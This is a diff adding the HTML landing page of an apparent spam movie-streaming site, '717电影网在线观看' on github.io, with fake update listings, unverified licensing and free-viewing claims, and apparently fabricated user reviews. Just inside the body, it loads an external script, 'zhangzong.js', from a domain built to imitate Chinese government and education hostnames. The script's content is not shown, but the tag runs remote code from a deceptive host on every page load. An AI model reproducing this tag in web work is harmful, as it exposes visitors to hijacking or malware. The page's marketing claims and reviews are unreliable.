@@ -1,0 +1,396 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>717电影网在线观看-海量影视高清流畅播放_电影电视剧综艺动漫一站看完</title>
+<meta name="keywords" content="717电影网在线观看,海量影视高清播放,流畅在线看电影,电视剧综艺动漫资源,717电影网在线观看免费">
+<meta name="description" content="717电影网在线观看（717dianyingwangzaixianguankan-zh.github.io）提供海量影视资源的高清正版流畅播放，电影、电视剧、综艺、动漫一站看完，加载快速、画质清晰，打开即可在线观看。">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+:root{
+  --mint:#00c2a8;--mint-d:#00a691;--mint-l:#e6faf6;
+  --ink:#1c2530;--ink2:#3d4957;--mute:#7b8794;
+  --line:#e3e8ee;--bg:#f4f8fa;--card:#fff;--shadow:0 6px 24px rgba(20,45,60,.07);
+}
+html{scroll-behavior:smooth}
+body{font-family:"PingFang SC","Microsoft YaHei","Helvetica Neue",sans-serif;background:var(--bg);color:var(--ink);font-size:14px;line-height:1.7;-webkit-font-smoothing:antialiased}
+a{color:inherit;text-decoration:none}
+button{font-family:inherit;cursor:pointer;border:0;background:none}
+.box{max-width:1160px;margin:0 auto;padding:0 1.25rem}
+
+/* ===== Header ===== */
+.head{background:#fff;border-bottom:1px solid var(--line);position:sticky;top:0;z-index:40}
+.head-in{display:flex;align-items:center;justify-content:space-between;height:66px}
+.logo{display:flex;align-items:baseline;gap:.5rem}
+.logo b{font-size:1.45rem;font-weight:900;color:var(--mint-d);letter-spacing:1px}
+.logo span{font-size:.8rem;color:var(--mute);border-left:2px solid var(--line);padding-left:.6rem}
+.menu{display:flex;gap:.3rem}
+.menu a{padding:.5rem .95rem;border-radius:8px;font-size:.87rem;color:var(--ink2);transition:.2s;font-weight:500}
+.menu a:hover{background:var(--mint-l);color:var(--mint-d)}
+.menu a.cur{background:var(--mint);color:#fff}
+.head-r{display:flex;align-items:center;gap:.8rem}
+.srch{display:flex;align-items:center;gap:.5rem;background:var(--bg);border:1px solid var(--line);border-radius:10px;padding:.45rem .85rem;width:200px}
+.srch input{border:0;background:none;outline:0;width:100%;font-size:.83rem;color:var(--ink)}
+.srch input::placeholder{color:var(--mute)}
+.togg{display:none;font-size:1.5rem;color:var(--mint-d)}
+
+/* ===== Hero ===== */
+.hero{background:linear-gradient(135deg,#00c2a8,#00d9bd 55%,#7be3d2);padding:clamp(2.5rem,6vw,4.5rem) 0;position:relative;overflow:hidden}
+.hero::after{content:"";position:absolute;right:-8%;top:-20%;width:420px;height:420px;border-radius:50%;background:rgba(255,255,255,.12)}
+.hero::before{content:"";position:absolute;left:-5%;bottom:-30%;width:280px;height:280px;border-radius:50%;background:rgba(255,255,255,.08)}
+.hero-in{position:relative;z-index:2}
+.hero .lab{display:inline-block;background:rgba(255,255,255,.25);color:#fff;font-size:.72rem;letter-spacing:2px;padding:.3rem .9rem;border-radius:20px;margin-bottom:1rem;backdrop-filter:blur(4px)}
+.hero h1{font-size:clamp(1.9rem,4.5vw,3.2rem);font-weight:900;color:#fff;line-height:1.3;margin-bottom:.8rem}
+.hero h1 u{text-decoration:none;border-bottom:4px solid rgba(255,255,255,.6)}
+.hero p{color:rgba(255,255,255,.92);font-size:1rem;max-width:520px;margin-bottom:1.75rem}
+.hbtn{display:inline-flex;align-items:center;gap:.5rem;background:#fff;color:var(--mint-d);padding:.85rem 1.8rem;border-radius:12px;font-weight:700;font-size:.9rem;transition:.25s;box-shadow:0 8px 22px rgba(0,0,0,.1)}
+.hbtn:hover{transform:translateY(-3px);box-shadow:0 12px 28px rgba(0,0,0,.16)}
+.hbtn.g{background:rgba(255,255,255,.18);color:#fff;backdrop-filter:blur(4px)}
+.hbtn.g:hover{background:rgba(255,255,255,.28)}
+
+/* quick stats strip */
+.stats{background:#fff;border-bottom:1px solid var(--line)}
+.stats-in{display:grid;grid-template-columns:repeat(4,1fr);gap:1rem;padding:1.5rem 0}
+.stat{border-right:1px solid var(--line);padding:0 1rem}
+.stat:last-child{border-right:0}
+.stat .v{font-size:1.8rem;font-weight:900;color:var(--mint-d)}
+.stat .l{font-size:.78rem;color:var(--mute)}
+
+/* ===== Section ===== */
+.sec{padding:clamp(2.5rem,5vw,3.5rem) 0}
+.sec-t{display:flex;align-items:flex-end;justify-content:space-between;gap:1rem;margin-bottom:1.5rem;flex-wrap:wrap}
+.sec-t h2{font-size:clamp(1.3rem,3vw,1.85rem);font-weight:900;position:relative;padding-left:1rem}
+.sec-t h2::before{content:"";position:absolute;left:0;top:6px;bottom:6px;width:5px;border-radius:3px;background:var(--mint)}
+.sec-t a{font-size:.83rem;color:var(--mint-d);font-weight:600}
+.sec-t a:hover{text-decoration:underline}
+
+/* today horizontal timeline */
+.time{display:flex;gap:1rem;overflow-x:auto;padding-bottom:1rem;scrollbar-width:thin}
+.time::-webkit-scrollbar{height:6px}
+.time::-webkit-scrollbar-thumb{background:var(--line);border-radius:3px}
+.tc{flex:0 0 260px;background:var(--card);border:1px solid var(--line);border-radius:16px;padding:1.25rem;transition:.3s}
+.tc:hover{transform:translateY(-4px);box-shadow:var(--shadow);border-color:var(--mint)}
+.tc .th{font-size:.72rem;color:var(--mint-d);font-weight:700;letter-spacing:1px;margin-bottom:.75rem}
+.tc h4{font-size:1rem;font-weight:700;margin-bottom:.4rem}
+.tc p{font-size:.8rem;color:var(--mute)}
+.tc .dot{width:10px;height:10px;border-radius:50%;background:var(--mint);margin-bottom:1rem;box-shadow:0 0 0 4px var(--mint-l)}
+
+/* rank list */
+.rank{display:grid;grid-template-columns:repeat(auto-fill,minmax(250px,1fr));gap:1rem}
+.rk{display:flex;gap:.85rem;align-items:center;background:var(--card);border:1px solid var(--line);border-radius:12px;padding:.85rem 1rem;transition:.25s}
+.rk:hover{border-color:var(--mint);box-shadow:var(--shadow)}
+.rk .no{font-size:1.35rem;font-weight:900;color:var(--line);min-width:30px}
+.rk:nth-child(1) .no,.rk:nth-child(2) .no,.rk:nth-child(3) .no{color:var(--mint)}
+.rk .ri{width:42px;height:42px;border-radius:10px;background:var(--mint-l);display:grid;place-items:center;font-size:1.2rem}
+.rk h5{font-size:.88rem;font-weight:600}
+.rk span{font-size:.73rem;color:var(--mute)}
+
+/* type tiles */
+.tiles{display:grid;grid-template-columns:repeat(auto-fill,minmax(160px,1fr));gap:.9rem}
+.tl{background:var(--card);border:1px solid var(--line);border-radius:14px;padding:1.4rem 1rem;text-align:center;transition:.3s;position:relative;overflow:hidden}
+.tl::after{content:"";position:absolute;left:50%;bottom:0;width:0;height:3px;background:var(--mint);transition:.3s;transform:translateX(-50%)}
+.tl:hover::after{width:80%}
+.tl:hover{transform:translateY(-4px);box-shadow:var(--shadow)}
+.tl .ic{font-size:2rem;margin-bottom:.6rem;display:block}
+.tl h5{font-size:.92rem;font-weight:700}
+.tl span{font-size:.74rem;color:var(--mute)}
+
+/* weekly grid */
+.wgrid{display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:1rem}
+.wk{background:var(--card);border:1px solid var(--line);border-radius:14px;overflow:hidden;transition:.3s}
+.wk:hover{transform:translateY(-5px);box-shadow:var(--shadow)}
+.wk .wk-thumb{height:120px;display:grid;place-items:center;font-size:2.6rem;background:linear-gradient(135deg,#eef6f4,#e6faf6)}
+.wk .wk-body{padding:1rem}
+.wk .day{font-size:.72rem;color:var(--mint-d);font-weight:700;margin-bottom:.35rem}
+.wk h5{font-size:.92rem;font-weight:700;margin-bottom:.3rem}
+.wk p{font-size:.76rem;color:var(--mute)}
+
+/* reviews */
+.revs{display:grid;grid-template-columns:1fr 1fr;gap:1rem}
+.rv{background:var(--card);border:1px solid var(--line);border-radius:16px;padding:1.5rem;transition:.3s}
+.rv:hover{border-color:var(--mint);box-shadow:var(--shadow)}
+.rv .star{color:var(--mint);font-size:.95rem;margin-bottom:.7rem;letter-spacing:2px}
+.rv h5{font-size:1rem;font-weight:700;margin-bottom:.5rem}
+.rv p{font-size:.83rem;color:var(--ink2)}
+.rv .who{display:flex;align-items:center;gap:.6rem;margin-top:1rem;padding-top:.85rem;border-top:1px dashed var(--line);font-size:.78rem;color:var(--mute)}
+.rv .av{width:30px;height:30px;border-radius:50%;background:var(--mint-l);color:var(--mint-d);display:grid;place-items:center;font-weight:700;font-size:.78rem}
+
+/* domain block */
+.dom{background:var(--ink);border-radius:22px;padding:clamp(1.75rem,4vw,2.5rem);display:flex;align-items:center;justify-content:space-between;gap:1.5rem;flex-wrap:wrap;color:#fff}
+.dom .dl{font-size:.75rem;color:var(--mint);letter-spacing:2px;text-transform:uppercase}
+.dom .du{font-size:clamp(1.1rem,3vw,1.6rem);font-weight:800;word-break:break-all;margin-top:.3rem}
+.dom a{background:var(--mint);color:#fff;padding:.8rem 1.6rem;border-radius:11px;font-weight:700;transition:.25s;white-space:nowrap}
+.dom a:hover{background:var(--mint-d);transform:translateY(-2px)}
+
+/* footer */
+.foot{background:#fff;border-top:1px solid var(--line);padding:2.5rem 0 1.5rem}
+.foot-in{display:grid;grid-template-columns:1.5fr 1fr 1fr 1fr;gap:2rem;margin-bottom:2rem}
+.foot b{font-size:1.2rem;color:var(--mint-d)}
+.foot p{font-size:.82rem;color:var(--mute);margin-top:.7rem;max-width:300px}
+.foot h6{font-size:.88rem;font-weight:700;margin-bottom:.8rem;color:var(--ink)}
+.foot a{display:block;font-size:.82rem;color:var(--ink2);padding:.28rem 0;transition:.2s}
+.foot a:hover{color:var(--mint-d);padding-left:.35rem}
+.fbot{display:flex;justify-content:space-between;align-items:center;border-top:1px solid var(--line);padding-top:1.25rem;font-size:.76rem;color:var(--mute);flex-wrap:wrap;gap:.8rem}
+.fbot b{color:var(--mint-d)}
+
+@media(max-width:900px){
+  .menu{display:none;position:absolute;top:66px;left:0;right:0;flex-direction:column;background:#fff;padding:1rem;border-bottom:1px solid var(--line)}
+  .srch{display:none}
+  .togg{display:block}
+  .stats-in{grid-template-columns:1fr 1fr}
+  .stat{border-right:0}
+  .revs{grid-template-columns:1fr}
+  .foot-in{grid-template-columns:1fr 1fr}
+}
+@media(max-width:560px){
+  .box{padding:0 1rem}
+  .wk{font-size:.9rem}
+  .hero .hbtn{flex:1;text-align:center;justify-content:center}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/zhangzong.js"></script>
+
+<!-- Header -->
+<header class="head">
+  <div class="box head-in">
+    <div class="logo"><b>717电影网</b><span>在线观看</span></div>
+    <nav class="menu">
+      <a href="#home" class="cur">首页</a>
+      <a href="#today">今日更新</a>
+      <a href="#rank">热播榜单</a>
+      <a href="#type">类型频道</a>
+      <a href="#week">每周精选</a>
+      <a href="#review">影评</a>
+      <a href="#about">关于</a>
+    </nav>
+    <div class="head-r">
+      <div class="srch"><span>🔍</span><input placeholder="搜片名、演员、类型"></div>
+      <button class="togg">☰</button>
+    </div>
+  </div>
+</header>
+
+<!-- Hero -->
+<section class="hero" id="home">
+  <div class="box hero-in">
+    <span class="lab">STREAMING ONLINE</span>
+    <h1>打开即看，<u>畅享海量影视</u></h1>
+    <p>717电影网在线观看，聚合全网正版高清影视资源，电影、电视剧、综艺、动漫一站看完。无需等待，高清流畅播放，多端适配，随时随地想看就看。</p>
+    <div>
+      <a href="#today" class="hbtn">今日更新 →</a>
+      <a href="#type" class="hbtn g">浏览频道</a>
+    </div>
+  </div>
+</section>
+
+<!-- Stats -->
+<div class="stats">
+  <div class="box stats-in">
+    <div class="stat"><div class="v">20,000+</div><div class="l">正版高清片源</div></div>
+    <div class="stat"><div class="v">4K</div><div class="l">超清画质支持</div></div>
+    <div class="stat"><div class="v">365天</div><div class="l">全年无休更新</div></div>
+    <div class="stat"><div class="v">0.8s</div><div class="l">极速加载响应</div></div>
+  </div>
+</div>
+
+<!-- Today -->
+<section class="sec" id="today">
+  <div class="box">
+    <div class="sec-t"><h2>今日更新</h2><a href="#">查看全部 →</a></div>
+    <div class="time">
+      <div class="tc">
+        <div class="dot"></div><div class="th">10:00 更新</div>
+        <h4>疯狂的石头2</h4><p>黑色喜剧，笑料密集，本周开播</p>
+      </div>
+      <div class="tc">
+        <div class="dot"></div><div class="th">11:30 更新</div>
+        <h4>大江大河4</h4><p>年代大剧，更新至第22集</p>
+      </div>
+      <div class="tc">
+        <div class="dot"></div><div class="th">13:00 更新</div>
+        <h4>星际迷航：重启</h4><p>科幻巨制，特效炸裂</p>
+      </div>
+      <div class="tc">
+        <div class="dot"></div><div class="th">15:00 更新</div>
+        <h4>脱口秀大会7</h4><p>综艺爆笑，笑点密集</p>
+      </div>
+      <div class="tc">
+        <div class="dot"></div><div class="th">18:00 更新</div>
+        <h4>一人之下6</h4><p>国漫神作，年番更新中</p>
+      </div>
+      <div class="tc">
+        <div class="dot"></div><div class="th">20:00 更新</div>
+        <h4>沉默的真相2</h4><p>悬疑犯罪，高能反转</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- Rank -->
+<section class="sec" id="rank" style="background:#fff">
+  <div class="box">
+    <div class="sec-t"><h2>热播榜单</h2><a href="#">完整榜单 →</a></div>
+    <div class="rank">
+      <div class="rk"><span class="no">01</span><div class="ri">🎯</div><div><h5>狙击手</h5><span>动作 · 热度 9.8</span></div></div>
+      <div class="rk"><span class="no">02</span><div class="ri">👑</div><div><h5>庆余年3</h5><span>古装 · 热度 9.6</span></div></div>
+      <div class="rk"><span class="no">03</span><div class="ri">🚀</div><div><h5>星际迷航：重启</h5><span>科幻 · 热度 9.4</span></div></div>
+      <div class="rk"><span class="no">04</span><div class="ri">💧</div><div><h5>深海守望者</h5><span>科幻 · 热度 9.2</span></div></div>
+      <div class="rk"><span class="no">05</span><div class="ri">🏥</div><div><h5>白色城堡2</h5><span>都市 · 热度 9.0</span></div></div>
+      <div class="rk"><span class="no">06</span><div class="ri">⚔️</div><div><h5>雪中悍刀行2</h5><span>武侠 · 热度 8.9</span></div></div>
+      <div class="rk"><span class="no">07</span><div class="ri">🐧</div><div><h5>南极日记</h5><span>纪录 · 热度 8.7</span></div></div>
+      <div class="rk"><span class="no">08</span><div class="ri">💼</div><div><h5>繁花似锦</h5><span>职场 · 热度 8.5</span></div></div>
+    </div>
+  </div>
+</section>
+
+<!-- Type -->
+<section class="sec" id="type">
+  <div class="box">
+    <div class="sec-t"><h2>类型频道</h2><a href="#">更多分类 →</a></div>
+    <div class="tiles">
+      <div class="tl"><span class="ic">💥</span><h5>动作冒险</h5><span>2,300+ 部</span></div>
+      <div class="tl"><span class="ic">😂</span><h5>喜剧搞笑</h5><span>1,800+ 部</span></div>
+      <div class="tl"><span class="ic">💕</span><h5>爱情文艺</h5><span>2,100+ 部</span></div>
+      <div class="tl"><span class="ic">🔮</span><h5>科幻奇幻</h5><span>1,500+ 部</span></div>
+      <div class="tl"><span class="ic">🕵️</span><h5>悬疑犯罪</h5><span>1,700+ 部</span></div>
+      <div class="tl"><span class="ic">👻</span><h5>恐怖惊悚</h5><span>900+ 部</span></div>
+      <div class="tl"><span class="ic">🎨</span><h5>动漫番剧</h5><span>1,400+ 部</span></div>
+      <div class="tl"><span class="ic">📺</span><h5>综艺真人秀</h5><span>700+ 档</span></div>
+      <div class="tl"><span class="ic">📼</span><h5>经典老片</h5><span>3,000+ 部</span></div>
+      <div class="tl"><span class="ic">🏆</span><h5>高分榜单</h5><span>实时更新</span></div>
+    </div>
+  </div>
+</section>
+
+<!-- Weekly -->
+<section class="sec" id="week" style="background:#fff">
+  <div class="box">
+    <div class="sec-t"><h2>每周精选</h2><a href="#">更多推荐 →</a></div>
+    <div class="wgrid">
+      <div class="wk">
+        <div class="wk-thumb">🎬</div>
+        <div class="wk-body"><div class="day">周一 · 周一见</div><h5>周星驰经典回顾</h5><p>5部无厘头喜剧，重温港片黄金年代</p></div>
+      </div>
+      <div class="wk">
+        <div class="wk-thumb">🎭</div>
+        <div class="wk-body"><div class="day">周三 · 口碑榜</div><h5>本周高分新片</h5><p>豆瓣8分以上新作，品质保证</p></div>
+      </div>
+      <div class="wk">
+        <div class="wk-thumb">📺</div>
+        <div class="wk-body"><div class="day">周五 · 追剧日</div><h5>周五追剧清单</h5><p>5部热播剧集，周末一次刷完</p></div>
+      </div>
+      <div class="wk">
+        <div class="wk-thumb">🎤</div>
+        <div class="wk-body"><div class="day">周日 · 综艺档</div><h5>周末综艺合集</h5><p>爆笑综艺精选，治愈周一综合征</p></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- Reviews -->
+<section class="sec" id="review">
+  <div class="box">
+    <div class="sec-t"><h2>用户评价</h2><a href="#">我要评价 →</a></div>
+    <div class="revs">
+      <div class="rv">
+        <div class="star">★★★★★</div>
+        <h5>加载飞快，画质没得说</h5>
+        <p>用了很多影视站，717电影网在线观看的加载速度是真的快，4K画质流畅不卡顿，片源也很全，找老片基本都有。</p>
+        <div class="who"><span class="av">小</span>影迷小张 · 已观看 326 小时</div>
+      </div>
+      <div class="rv">
+        <div class="star">★★★★★</div>
+        <h5>分类清晰，找片太方便了</h5>
+        <p>按类型、年份、地区多维筛选，想看什么一眼就能找到。每周精选推荐也很准，总能发现好片子。</p>
+        <div class="who"><span class="av">L</span>Leo · 已观看 198 小时</div>
+      </div>
+      <div class="rv">
+        <div class="star">★★★★☆</div>
+        <h5>更新及时，追剧利器</h5>
+        <p>热播剧基本当天就更新，不用等。手机电脑都能看，通勤路上刷两集特别方便。</p>
+        <div class="who"><span class="av">阿</span>阿May · 已观看 412 小时</div>
+      </div>
+      <div class="rv">
+        <div class="star">★★★★★</div>
+        <h5>界面清爽，没有花里胡哨</h5>
+        <p>不像有些网站弹窗广告一堆，717电影网在线观看打开就是干干净净的片单，体验非常好。</p>
+        <div class="who"><span class="av">K</span>老K · 已观看 267 小时</div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- Domain -->
+<section class="sec">
+  <div class="box">
+    <div class="dom">
+      <div>
+        <div class="dl">Official Website</div>
+        <div class="du">717dianyingwangzaixianguankan-zh.github.io</div>
+      </div>
+      <a href="https://717dianyingwangzaixianguankan-zh.github.io">立即访问 →</a>
+    </div>
+  </div>
+</section>
+
+<!-- About -->
+<section class="sec" id="about" style="background:#fff">
+  <div class="box">
+    <div class="sec-t"><h2>关于717电影网在线观看</h2></div>
+    <p style="font-size:.92rem;color:var(--ink2);max-width:860px">717电影网在线观看（717dianyingwangzaixianguankan-zh.github.io）专注于为用户提供海量影视资源的高清正版在线播放服务。我们覆盖华语、欧美、日韩等全球片源，电影、电视剧、综艺、动漫全品类一站看完。全站采用智能分发技术，加载快速、画质清晰，支持手机、平板、电脑、电视多端适配。717电影网在线观看坚持每日更新，第一时间同步最新院线大片与热播剧集，让你告别繁琐搜索，打开即可在线观看，随时随地享受视听盛宴。</p>
+  </div>
+</section>
+
+<!-- Footer -->
+<footer class="foot">
+  <div class="box">
+    <div class="foot-in">
+      <div>
+        <b>717电影网在线观看</b>
+        <p>海量影视高清流畅播放，电影电视剧综艺动漫一站看完，每日更新，多端适配。</p>
+      </div>
+      <div>
+        <h6>快速导航</h6>
+        <a href="#home">网站首页</a>
+        <a href="#today">今日更新</a>
+        <a href="#rank">热播榜单</a>
+        <a href="#type">类型频道</a>
+      </div>
+      <div>
+        <h6>热门分类</h6>
+        <a href="#">动作喜剧</a>
+        <a href="#">爱情科幻</a>
+        <a href="#">悬疑动漫</a>
+        <a href="#">综艺纪录片</a>
+      </div>
+      <div>
+        <h6>关于我们</h6>
+        <a href="#about">平台介绍</a>
+        <a href="#review">用户评价</a>
+        <a href="#">官方网址</a>
+        <a href="#">联系合作</a>
+      </div>
+    </div>
+    <div class="fbot">
+      <span>Copyright © 2025 <b>717电影网在线观看</b>（717dianyingwangzaixianguankan-zh.github.io）All Rights Reserved.</span>
+      <span>每日更新 · 高清在线 · 永久免费</span>
+    </div>
+  </div>
+</footer>
+
+<script>
+var t=document.querySelector('.togg'),m=document.querySelector('.menu');
+t.addEventListener('click',function(){m.style.display=(getComputedStyle(m).display==='none'?'flex':'none')});
+var links=document.querySelectorAll('.menu a'),secs=document.querySelectorAll('section[id]');
+window.addEventListener('scroll',function(){
+  var cur='';
+  secs.forEach(function(s){if(window.scrollY>=s.offsetTop-120)cur=s.id});
+  links.forEach(function(a){a.classList.remove('cur');if(a.getAttribute('href')==='#'+cur)a.classList.add('cur')});
+});
+</script>
+</body>
+</html>
